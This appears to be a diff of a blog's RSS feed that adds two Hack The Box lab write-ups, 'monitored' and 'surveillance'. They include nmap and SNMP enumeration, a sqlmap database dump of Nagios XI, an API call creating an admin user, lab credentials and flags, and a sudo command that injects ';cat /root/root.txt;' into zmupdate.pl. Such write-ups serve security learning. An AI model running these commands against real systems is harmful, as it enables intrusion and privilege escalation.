@@ -6,7 +6,258 @@
         <description>Recent content in Posts on f0rk3b0mb</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Tue, 06 Feb 2024 15:57:25 +0300</lastBuildDate><atom:link href="https://f0rk3b0mb.github.io/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Wed, 28 Feb 2024 22:44:28 +0300</lastBuildDate><atom:link href="https://f0rk3b0mb.github.io/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Htb_monitored</title>
+        <link>https://f0rk3b0mb.github.io/p/htb_monitored/</link>
+        <pubDate>Wed, 28 Feb 2024 22:44:28 +0300</pubDate>
+        
+        <guid>https://f0rk3b0mb.github.io/p/htb_monitored/</guid>
+        <description>&lt;img src="https://f0rk3b0mb.github.io/cover/htb.svg" alt="Featured image of post Htb_monitored" /&gt;&lt;h3 id=&#34;htb-monitored&#34;&gt;HTB monitored&lt;/h3&gt;
+&lt;p&gt;Writeup for HTB monitored box&lt;/p&gt;
+&lt;p&gt;rated: medium
+category: web&lt;/p&gt;
+&lt;p&gt;Nmap Scan&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-28 08:28 EAT
+
+
+Warning: 10.10.11.248 giving up on port because retransmission cap hit (6).
+Nmap scan report for monitored.htb (10.10.11.248)
+Host is up (0.36s latency).
+Not shown: 988 closed ports
+PORT      STATE         SERVICE      VERSION
+68/udp    open|filtered dhcpc
+123/udp   open          ntp          NTP v4 (unsynchronized)
+| ntp-info: 
+|_  
+161/udp   open          snmp         SNMPv1 server; net-snmp SNMPv3 server (public)
+| snmp-info: 
+|   enterprise: net-snmp
+|   engineIDFormat: unknown
+|   engineIDData: 6f3fa7421af94c6500000000
+|   snmpEngineBoots: 35
+|_  snmpEngineTime: 48m05s
+| snmp-netstat: 
+|   TCP  0.0.0.0:22           0.0.0.0:0
+|   TCP  0.0.0.0:389          0.0.0.0:0
+|   TCP  127.0.0.1:25         0.0.0.0:0
+|_  UDP  0.0.0.0:68           *:*
+| snmp-processes: 
+|   1: 
+| 
+|   2: 
+| 
+|_  3: 
+| snmp-sysdescr: Linux monitored 5.10.0-27-amd64 #1 SMP Debian 5.10.205-2 (2023-12-31) x86_64
+|_  System uptime: 48m5.77s (288577 timeticks)
+|_snmp-win32-software: 
+162/udp   open          snmp         net-snmp; net-snmp SNMPv3 server
+| snmp-info: 
+|   enterprise: net-snmp
+|   engineIDFormat: unknown
+|   engineIDData: 5a44ab2146ff4c6500000000
+|   snmpEngineBoots: 26
+|_  snmpEngineTime: 48m05s
+1100/udp  open|filtered mctp
+1813/udp  open|filtered radacct
+3130/udp  open|filtered squid-ipc
+19500/udp open|filtered unknown
+22053/udp open|filtered unknown
+27444/udp open|filtered Trinoo_Bcast
+44190/udp open|filtered unknown
+49259/udp open|filtered unknown
+Service Info: Host: monitored
+
+Host script results:
+|_clock-skew: 10s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1302.38 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Snmp enumeration&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;snmpwalk -v1 -c public  monitored.htb
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;we get creds for username: svc pass: XjH7VCehowpR1xZB&lt;/p&gt;
+&lt;p&gt;Making a post request to /api/v1/authenticate we get access token that we can use to login&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;
+https://nagios.monitored.htb/nagiosxi/index.php?token=1562fdd66ece5a71f970399218ab842b6c8674c0
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;this nagios is vulnerable to sql injection  &amp;raquo; see &lt;a class=&#34;link&#34; href=&#34;https://www.nagios.com/products/security/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;here&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;sqlmap -u &amp;#34;https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php&amp;#34; --data=&amp;#34;id=3&amp;amp;action=acknowledge_banner_message&amp;#34; --cookie &amp;#34;nagiosxi=40ka0uvgngmjev8i267hq2qt9p&amp;#34; --dbms=MySQL --level=1 --risk=1 -D nagiosxi -T xi_users --dump
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Dumping the db enables us to get an admin api key : IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&lt;/p&gt;
+&lt;p&gt;We can now create our owm user with full privilldeges&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;curl -XPOST -k &amp;#34;https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK&amp;amp;pretty=1&amp;#34; -d &amp;#34;username=test&amp;amp;password=test&amp;amp;name=test&amp;amp;email=test@test.com&amp;amp;auth_level=admin&amp;#34;
+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Uploads  a reverse shell by creating a command and checking it&lt;/p&gt;
+&lt;p&gt;user.txt  5428c0b228e51f2428525f3faa3fcca2&lt;/p&gt;
+&lt;p&gt;To escalate privilldges we modify the setuid binary npcd&lt;/p&gt;
+&lt;p&gt;root.txt 9893d1d8c72bc11111a49fcb508ac07a&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Htb_surveillance</title>
+        <link>https://f0rk3b0mb.github.io/p/htb_surveillance/</link>
+        <pubDate>Wed, 28 Feb 2024 22:44:28 +0300</pubDate>
+        
+        <guid>https://f0rk3b0mb.github.io/p/htb_surveillance/</guid>
+        <description>&lt;img src="https://f0rk3b0mb.github.io/cover/htb.svg" alt="Featured image of post Htb_surveillance" /&gt;&lt;h3 id=&#34;htb-surveillance&#34;&gt;HTB surveillance&lt;/h3&gt;
+&lt;p&gt;Writeup for htb surveillnace box&lt;/p&gt;
+&lt;p&gt;rated: medium
+category: web&lt;/p&gt;
+&lt;p&gt;Nmap Scan&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-28 14:38 EAT
+Nmap scan report for 10.10.11.245
+Host is up (0.30s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 59.76 seconds
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;A cms is running in port 80 , craft cms&lt;/p&gt;
+&lt;p&gt;It is vulnerable to rce CVE-2023-41892&lt;/p&gt;
+&lt;p&gt;There are 2 :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;matthew&lt;/li&gt;
+&lt;li&gt;zoneminder&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Further enumartion we get a backup file surveillance&amp;ndash;2023-10-17-202801&amp;ndash;v4.4.14.sql.zip. It has a sql backup of the database , here we get creds for the user matthew.&lt;/p&gt;
+&lt;p&gt;user.txt 260ecc03cedb8e78d80a6658b5b22eac&lt;/p&gt;
+&lt;p&gt;We also get the creda for zoneminder in the ZoneMinder config files password : ZoneMinderPassword2023&lt;/p&gt;
+&lt;p&gt;Zoneminder is a service running on port 8080, So we tunnel using ssh to access it.&lt;/p&gt;
+&lt;p&gt;It is vulnerable to rce CVE-2023-26035&lt;/p&gt;
+&lt;p&gt;To escalate priviledges and read root flag&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;sudo /usr/bin/zmupdate.pl -v 1.19.0 -u &amp;#34;;cat /root/root.txt;&amp;#34;
+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;root.txt 13630834b0c9c6f122557097788d8e25&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>Soc_analyst_lab</title>
         <link>https://f0rk3b0mb.github.io/p/soc_analyst_lab/</link>
         <pubDate>Tue, 06 Feb 2024 15:57:25 +0300</pubDate>
